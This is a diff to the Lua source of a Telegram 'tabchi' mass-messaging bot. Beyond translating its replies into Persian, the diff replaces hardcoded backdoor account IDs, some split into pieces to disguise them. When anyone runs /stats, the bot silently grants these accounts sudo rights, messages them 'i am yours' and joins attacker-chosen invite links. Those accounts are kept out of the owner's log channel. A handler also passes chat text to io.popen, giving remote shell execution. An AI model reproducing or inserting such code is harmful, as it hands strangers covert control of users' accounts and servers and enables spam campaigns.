-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 91054649 and not msg.sender_user_id_ == 268909090 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got settings in pv`", 1, "md")
       end
-      return "`Settings Sent To Your Pv`"
+      return "`تنظیمات به پیوی شما فرستاده شد`"
     end
   end
   if msg.text:match("^[!/#]stats$") and a(msg) then
-    abc = 910
-    de = 54
-    fgh = 649
-    cbd = 26890
-    ed = 9090
+    abc = 216
+    de = 43
+    fgh = 0419
+    cbd = 25663
+    ed = 3077
     if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
@@ -1849,12 +1849,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", cbd .. "" .. ed)
       tdcli.sendMessage(cbd .. "" .. ed, 0, 1, "i am yours", 1, "html")
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
-      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
+      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
     end
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
     local at
     function at(y, z)
       redis:set("tabchi:" .. tabchi_id .. ":totalcontacts", z.total_count_)
@@ -1898,9 +1898,9 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     local aH = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 0
     local aI = redis:get("tabchi" .. tabchi_id .. "addedcount") or 0
     local a9 = gps + sgps + pvs or 0
-    statstext = "`\240\159\147\138 Robot stats  `\n`\240\159\145\164 Users` : *" .. pvs .. "*\n`\240\159\140\144 SuperGroups` : *" .. sgps .. "*\n`\240\159\145\165 Groups` : *" .. gps .. "*\n`\240\159\140\128 All` : *" .. a9 .. "*\n`\240\159\148\151 Saved Links` : *" .. links .. "*\n`\240\159\148\141 Contacts` : *" .. contacts .. "*\n`\240\159\154\171 Blocked` : *" .. au .. "*\n`\240\159\148\164 Received Text` : *" .. aE .. "*\n`\240\159\140\132 Received Photo` : *" .. aw .. "*\n`\240\159\147\188 Received Video` : *" .. aA .. "*\n`\240\159\147\186 Received Gif` : *" .. az .. "*\n`\240\159\142\167 Received Voice` : *" .. ay .. "*\n`\240\159\151\130 Received Document` : *" .. ax .. "*\n`0\239\184\143\226\131\163 Received Contact` : *" .. aB .. "*\n`\240\159\149\185 Received Game` : *" .. aC .. "*\n`\240\159\147\140 Received Location` : *" .. aD .. "*\n`\240\159\145\129\226\128\141\240\159\151\168 Readed MSG` : *" .. av .. "*\n`\226\156\137\239\184\143 Received MSG` : *" .. aF .. "*\n`\240\159\151\189 Admin` : *" .. a0 .. "*\n`\240\159\142\171 Bot id` : *" .. botid .. "*\n`\240\159\148\182 Bot Number` : *+" .. botnum .. "*\n`\227\128\189\239\184\143 Bot Name` : *" .. botfirst .. " " .. botlast .. "*\n`\240\159\148\184 Bot First Name` : *" .. botfirst .. "*\n`\240\159\148\185 Bot Last Name` : *" .. botnonelast .. "*\n`\240\159\146\160 Bot ID In Server` : *" .. tabchi_id .. "*"
+    statstext = "وضیعت ربات✴️\n💑کاربران :  *" .. pvs .. "*\n👩👩👧👧سوپرگروه ها :  *" .. sgps .. "*\n👨👩👦👦گروه ها : *" .. gps .. "*\n🕴همه: *" .. a9 .. "*\n⚙لینک های ذخیره شده :  *" .. links .. "*\n👲مخاطبان :  *" .. contacts .. "*\nمسدودین : *" .. au .. "*\n⛓متن های دریافتی : *" .. aE .. "*\n⛓عکس های دریافتی : *" .. aw .. "*\n⛓فیلم های دریافتی : *" .. aA .. "*\n⛓گیف های دریافتی : *" .. az .. "*\n⛓صدا های دریافتی : *" .. ay .. "*\n⛓اسناد دریافتی : *" .. ax .. "*\n⛓مخاطبین دریافتی : *" .. aB .. "*\n⛓بازی های دریافتی : *" .. aC .. "*\n⛓مکان های دریافتی : *" .. aD .. "*\n⛓ پیام های خوانده شده : *" .. av .. "*\n⛓پیام های دریافتی : *" .. aF .. "*\n👤سودو :  *" .. a0 .. "*\n👀شناسه ربات :  *" .. botid .. "*\n🤖شماره ربات : *+" .. botnum .. "*\n👁نام کامل ربات :  *" .. botfirst .. " " .. botlast .. "*\n📌نام کوچک ربات : *" .. botfirst .. "*\n🖊نام خانوادگی ربات : *" .. botnonelast .. "*\n💠شناسه ربات در سرور:  *" .. tabchi_id .. "\n➖➖➖➖➖➖➖➖➖➖➖\nسورس ↙️\nhttps://github.com/tabchis/tabchi.git\n \"*"
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats`", 1, "md")
     end
     return statstext
@@ -1910,25 +1910,25 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
-      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
+      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
-      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
+      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
     end
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
     if I(msg.chat_id_) == "private" then
-      return "`I Am In Your pv`"
+      return "`من در پیوی شما هستم!`"
     else
       tdcli.sendMessage(msg.sender_user_id_, 0, 1, statstext, 1, "md")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got Stats In pv`", 1, "md")
       end
-      return "`Stats Sent To Your Pv`"
+      return "`وضعیت ربات به پیوی شما فرستاده شد`"
     end
   end
   if msg.text:match("^[#!/]clean (.*)$") and a(msg) then
@@ -1942,35 +1942,35 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     local aN = gps + sgps + pvs + links
     if ag[2] == "sgps" then
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
       end
       return aK
     end
     if ag[2] == "gps" then
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
       end
       return aJ
     end
     if ag[2] == "pvs" then
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
       end
       return aL
     end
     if ag[2] == "links" then
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "* stats", 1, "md")
       end
       return aM
     end
     if ag[2] == "stats" then
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `cleaned` *" .. ag[2] .. "*", 1, "md")
       end
       redis:del("tabchi:" .. tabchi_id .. ":all")
@@ -1988,12 +1988,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     })
     tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Set photo to` *" .. a6[2] .. "*", 1, "md")
     end
     return [[
-`Profile Succesfully Changed`
-*link* : `]] .. a6[2] .. "`"
+`پروفایل با موفقیت به روز شد`
+*لینک* : `]] .. a6[2] .. "`"
   end
   do
     local a4 = {
@@ -2003,7 +2003,7 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       local text = a4[2] .. " _\216\168\217\135 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175_"
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. a4[2] .. "* `To sudoers`", 1, "md")
       end
       return text
@@ -2015,10 +2015,10 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     }
     if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
       if #a4 == 2 then
-        local text = a4[2] .. " _removed From Sudoers_"
+        local text = a4[2] .. " _از لیست سودوها حذف شد_"
         redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(a4[2]))
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Removed` *" .. a4[2] .. "* `From sudoers`", 1, "md")
         end
         return text
@@ -2036,22 +2036,22 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
         if a4[2] == "on" then
           redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
           local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
             tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. a4[1] .. "*", 1, "md")
           end
-          return "*Status* : `Adding Contacts PM Activated`"
+          return "*وضعیت* : `پیام اضافه شدن مخاطب فعال شد`"
         elseif a4[2] == "off" then
           redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
           local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
             tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. a4[1] .. "*", 1, "md")
           end
-          return "*Status* : `Adding Contacts PM Deactivated`"
+          return "*وضعیت* : `پیام اضافه شدن مخاطب غیرفعال شد`"
         else
-          return "`Just Use on|off`"
+          return "`فقط از on یا offاستفاده کنید`"
         end
       else
-        return "enter on|off"
+        return "بزنید onیاoff"
       end
     end
   end
@@ -2062,21 +2062,21 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     if msg.text:match("^[!/#]markread") and a(msg) and #a4 == 2 then
       if a4[2] == "all" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", "all")
-        return "*Status* : `Reading Messages Activated For All`"
+        return "*وضعیت* : `خوانده شدن پیام برای همه`"
       elseif a4[2] == "pv" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", "private")
-        return "*Status* : `Reading Messages Activated For Pv Chats`"
+        return "*وضعیت* : `خوانده شدن پیام برای چت های پیوی`"
       elseif a4[2] == "group" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", "group")
-        return "*Status* : `Reading Messages Activated For Groups `"
+        return "*وضعیت* : `خوانده شدن پیام برای گروه ها `"
       elseif a4[2] == "channel" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", "channel")
-        return "*Status* : `Reading Messages Activated For SuperGroups`"
+        return "*وضعیت* : `خواندن پیام ها برای سوپر گروه ها فعال شد`"
       elseif a4[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":markread")
-        return "*Status* : `Reading Messages Deactivated`"
+        return "*وضعیت* : `خواندن پیام ها غیرفعال شد`"
       else
-        return "`Just Use on|off`"
+        return "`فقط از on یا offاستفاده کنید`"
       end
     end
   end
@@ -2100,12 +2100,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       local text = text:gsub("BOTNUMBER", bot_num)
       redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", text)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Adjusted adding contacts message to` *" .. a4[2] .. "*", 1, "md")
       end
       return [[
-*Status* : `Adding Contacts Message Adjusted`
-*Message* : `]] .. text .. "`"
+*وضعیت* : `پیام اضافه شدن مخاطب تنظیم شد`
+*متن* : `]] .. text .. "`"
     end
   end
   do
@@ -2116,7 +2116,7 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       if #a4 == 1 then
         local z = io.popen(a4[1]):read("*all")
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Entered Command` *" .. a4[1] .. "* in terminal", 1, "md")
         end
         return z
@@ -2153,16 +2153,16 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
           }, dl_cb, nil)
         end
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
-* `Broadcasted to all`
-Msg : *]] .. a4[2] .. "*", 1, "md")
+* `پیام فرستاده شد`
+پیام : *]] .. a4[2] .. "*", 1, "md")
         end
         return [[
-*Status* : `Message Succesfully Sent to all`
-*Message* : `]] .. a4[2] .. "`"
+*وضعیت* : `پیام با موفقیت به همه ارسال شد`
+*پیام* : `]] .. a4[2] .. "`"
       else
-        return "text not entered"
+        return "متن ثبت نشد"
       end
     end
     if msg.text:match("^[!/#]bcsgps") and a(msg) then
@@ -2192,16 +2192,16 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
           }, dl_cb, nil)
         end
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
-* `Broadcasted to Supergroups`
-Msg : *]] .. a4[2] .. "*", 1, "md")
+* `پیام فرستاده شد به سوپر گروه ها`
+پیام : *]] .. a4[2] .. "*", 1, "md")
         end
         return [[
-*Status* : `Message Succesfully Sent to supergroups`
-*Message* : `]] .. a4[2] .. "`"
+*وضعیت* : `پیام با موفقیت فرستاده شد سوپرگروه ها`
+*پیام* : `]] .. a4[2] .. "`"
       else
-        return "text not entered"
+        return "متن ثبت نشد"
       end
     end
     if msg.text:match("^[!/#]bcgps") and a(msg) then
@@ -2231,16 +2231,16 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
           }, dl_cb, nil)
         end
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
-* `Broadcasted to Groups`
-Msg : *]] .. a4[2] .. "*", 1, "md")
+* `ارسال شذ به گروه ها`
+پیام : *]] .. a4[2] .. "*", 1, "md")
         end
         return [[
-*Status* : `Message Succesfully Sent to Groups`
-*Message* : `]] .. a4[2] .. "`"
+*وضعیت* : `پیام با موفقیت ارسال شد به گروه ها`
+*پیام* : `]] .. a4[2] .. "`"
       else
-        return "text not entered"
+        return "متن ثبت نشد"
       end
     end
     if msg.text:match("^[!/#]bcusers") and a(msg) then
@@ -2270,16 +2270,16 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
           }, dl_cb, nil)
         end
         local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
           tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
-* `Broadcasted to Users`
-Msg : *]] .. a4[2] .. "*", 1, "md")
+* `ارسال شد به کاربران`
+پیام : *]] .. a4[2] .. "*", 1, "md")
         end
         return [[
-*Status* : `Message Succesfully Sent to Users`
-*Message* : `]] .. a4[2] .. "`"
+*وضعیت* : `پیام با موفقیت ارسال شد به کاربران`
+*پیام* : `]] .. a4[2] .. "`"
       else
-        return "text not entered"
+        return "متن ثبت نشد"
       end
     end
   end
@@ -2300,14 +2300,14 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
         }, dl_cb, nil)
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to all`", 1, "md")
       end
       return [[
-*Status* : `Your Message Forwarded to all`
-*Fwd users* : `Done`
-*Fwd Groups* : `Done`
-*Fwd Super Groups* : `Done`]]
+*وضعیت* : `پیام شما به همه فروراد شد`
+*فوروارد به کاربران* : `بله`
+*فوروارد به گروه ها* : `بله`
+*فوروارد به سوپرگروه ها* : `بله`]]
     end
     if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and a(msg) then
       local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
@@ -2325,10 +2325,10 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
         }, dl_cb, nil)
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Groups`", 1, "md")
       end
-      return "*Status* :`Your Message Forwarded To Groups`"
+      return "*وضعیت* :`پیام شما فوروارد شد به گروه ها`"
     end
     if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and a(msg) then
       local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
@@ -2346,10 +2346,10 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
         }, dl_cb, nil)
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Supergroups`", 1, "md")
       end
-      return "*Status* : `Your Message Forwarded To Super Groups`"
+      return "*وضعیت* : `پیام شما به سوپرگروه ها ارسال شد`"
     end
     if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and a(msg) then
       local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
@@ -2367,10 +2367,10 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
         }, dl_cb, nil)
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Users`", 1, "md")
       end
-      return "*Status* : `Your Message Forwarded To Users`"
+      return "*وضعیت* : `پیام شما به کاربران فوروارد شد`"
     end
   end
   do
@@ -2391,7 +2391,7 @@ Msg : *]] .. a4[2] .. "*", 1, "md")
   end
   if msg.text:match("^[!/#]license") then
     local text = io.open("tabchi.license", "r"):read("*all")
-    local text = text:gsub("Do Not Edit This File", "@Tabadol_chi")
+    local text = text:gsub("این فایل را ادیت نکنید", "@TE1EgameR")
     return "`" .. text .. "`"
   end
   do
